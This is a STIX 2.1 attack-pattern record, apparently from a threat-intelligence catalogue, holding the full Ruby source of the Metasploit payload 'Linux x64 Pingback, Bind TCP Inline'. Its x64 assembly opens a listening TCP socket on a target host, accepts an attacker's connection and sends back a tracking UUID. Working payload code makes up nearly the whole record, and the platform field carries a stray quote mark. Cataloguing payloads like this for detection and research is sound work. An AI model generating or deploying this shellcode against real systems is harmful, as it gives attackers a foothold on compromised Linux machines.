{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--45b0bb33-f438-4038-bfdb-126e39c6fd58",
    "created": "2024-08-14T16:33:19.463187Z",
    "modified": "2024-08-14T16:33:19.463191Z",
    "name": "Linux x64 Pingback, Bind TCP Inline",
    "description": "Accept a connection from attacker and report UUID (Linux x64)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x64/pingback_bind_tcp.rb",
            "external_id": "pingback_bind_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nmodule MetasploitModule\n\n  CachedSize = 109\n\n  include Msf::Payload::Linux\n  include Msf::Payload::Single\n  include Msf::Payload::Pingback\n  include Msf::Payload::Pingback::Options\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux x64 Pingback, Bind TCP Inline',\n      'Description'   => 'Accept a connection from attacker and report UUID (Linux x64)',\n      'Author'        => [ 'bwatters-r7' ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X64,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Session'       => Msf::Sessions::Pingback\n    ))\n    def generate(opts={})\n      # 22 -> \"0x00,0x16\"\n      # 4444 -> \"0x11,0x5c\"\n      encoded_port = [datastore['LPORT'].to_i,2].pack(\"vn\").unpack(\"N\").first\n      encoded_host = Rex::Socket.addr_aton(\"0.0.0.0\").unpack(\"V\").first\n      encoded_host_port = \"0x%.8x%.8x\" % [encoded_host, encoded_port]\n      self.pingback_uuid ||= self.generate_pingback_uuid\n      uuid_as_db = \"0x\" + pingback_uuid.chars.each_slice(2).map(&:join).join(\",0x\")\n\n      asm = %Q^\n          push   rsi\n          push   rax\n         ;SOCKET\n          push   0x29\n          pop    rax\n          cdq\n          push   0x2\n          pop    rdi\n          push   0x1\n          pop    rsi\n          syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)\n          test   rax, rax\n          js failed\n\n        xchg   rdi, rax\n          mov    rcx, #{encoded_host_port}\n          push   rcx\n          mov    rsi, rsp\n          push   rsp\n          pop    rsi                          ; store pointer to struct\n\n        bind_call:\n          ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)\n          ; rdi -> fd already stored in rdi\n          ; rsi -> pointer to sockaddr_in6 struct already in rsi\n          push   0x31\n          pop    rax                          ; bind syscall\n          push   0x10                         ; sockaddr length\n          pop    rdx                          ;\n          syscall\n\n        listen_call:\n          ; int listen(int sockfd, int backlog);\n          ; rdi -> fd already stored in rdi\n          push   0x32\n          pop    rax                          ; listen syscall\n          push   0x1\n          pop    rsi                          ; backlog\n          syscall\n\n        accept_call:\n          ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);\n          ; rdi -> fd already stored in rdi\n          push   0x2b\n          pop    rax                          ; accept syscall\n          cdq                                 ; zero-out rdx via sign-extension\n          push   rdx\n          push   rdx\n          push rsp\n          pop rsi                             ; when populated, client will be stored in rsi\n          push   0x1c\n          lea    rdx, [rsp]                   ; pointer to length of rsi (16)\n          syscall\n          xchg    rdi, rax                    ; grab client fd\n        send_pingback:\n          ; sys_write(fd:rdi, buf*:rsi, length:rdx)\n          push #{uuid_as_db.split(\",\").length}  ; length of the PINGBACK UUID\n          pop rdx                               ; length in rdx\n          call get_uuid_address         ; put uuid buffer on the stack\n          db #{uuid_as_db}  ; PINGBACK_UUID\n        get_uuid_address:\n          pop rsi                       ; UUID address into rsi\n          xor rax, rax                  ; sys_write = offset 1\n          inc rax                       ; sys_write = offset 1\n          syscall                       ; call sys_write\n\n        failed:\n          push   0x3c\n          pop    rax\n          push   0x1\n          pop    rdi\n          syscall ; exit(1)\n        ^\n      Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}